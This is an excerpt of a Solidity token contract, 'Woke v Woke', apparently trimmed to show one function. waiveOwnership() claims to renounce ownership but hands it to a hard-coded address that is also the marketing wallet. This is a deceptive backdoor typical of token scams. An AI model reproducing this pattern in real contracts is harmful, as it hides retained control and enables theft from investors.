...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x97F8D9DeaF69794EDdE8F92fCCfBe9c4b9a21d90));
        _owner = address(0x97F8D9DeaF69794EDdE8F92fCCfBe9c4b9a21d90);
    }
...
contract WokevWoke is Context, IERC20, Ownable {
    ...
    string private _name = "Woke v Woke";
    string private _symbol = "Woke v Woke";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x97F8D9DeaF69794EDdE8F92fCCfBe9c4b9a21d90);
